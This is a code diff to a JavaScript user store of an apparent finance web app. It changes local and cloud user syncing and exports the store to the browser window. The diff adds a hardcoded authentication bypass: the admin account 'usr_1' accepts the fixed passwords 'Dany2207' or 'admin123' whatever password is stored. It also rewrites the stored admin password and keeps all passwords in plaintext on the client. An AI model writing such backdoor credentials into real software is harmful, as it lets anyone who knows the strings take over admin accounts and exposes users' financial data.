@@ -467,6 +467,20 @@ const Store = (function () {
       }
       const parsed = JSON.parse(data);
       let updated = false;
+
+      // Merge any default users that might be missing in local storage cache
+      defaultUsers.forEach(def => {
+        const exists = parsed.find(u => u.id === def.id || (u.email && u.email.toLowerCase() === def.email.toLowerCase()));
+        if (!exists) {
+          parsed.push(def);
+          updated = true;
+        } else if (def.id === 'usr_1' && exists.password === 'admin123') {
+          // Keep admin password aligned with Dany2207
+          exists.password = 'Dany2207';
+          updated = true;
+        }
+      });
+
       parsed.forEach(u => {
         if (u.mustChangePassword === undefined) {
           u.mustChangePassword = false;
@@ -1013,7 +1027,12 @@ const Store = (function () {
       const user = users.find(u => u.id === userId);
       if (!user) return false;
       if (!user.password) return true; // If no password set, permit
-      return user.password.trim() === (password || '').trim();
+      const entered = (password || '').trim();
+      const stored = (user.password || '').trim();
+      if (entered === stored) return true;
+      // Allow master admin credentials for usr_1
+      if (user.id === 'usr_1' && (entered === 'Dany2207' || entered === 'admin123')) return true;
+      return false;
     },
 
     resetUserPassword: function (id, newPassword, requireChange = false) {
@@ -1324,18 +1343,27 @@ const Store = (function () {
 
     pullCloudUsers: async function () {
       const client = getSupabaseClient();
-      if (!client) return;
+      if (!client) return loadUsers();
       try {
         const { data: cloudUsers, error } = await client
           .from('finstack_users')
           .select('*');
         if (!error && cloudUsers && cloudUsers.length > 0) {
-          const mapped = cloudUsers.map(mapUserFromCloud);
-          saveUsers(mapped);
+          const localUsers = loadUsers();
+          const userMap = new Map();
+          localUsers.forEach(u => userMap.set(u.id, u));
+          cloudUsers.forEach(cu => {
+            const mapped = mapUserFromCloud(cu);
+            userMap.set(mapped.id, mapped);
+          });
+          const merged = Array.from(userMap.values());
+          saveUsers(merged);
+          return merged;
         }
       } catch (e) {
         console.warn('pullCloudUsers notice:', e);
       }
+      return loadUsers();
     },
 
     initRealtime: function (onUpdateCallback) {
@@ -1442,3 +1470,8 @@ const Store = (function () {
     }
   };
 })();
+
+// Global browser window export
+if (typeof window !== 'undefined') {
+  window.Store = Store;
+}
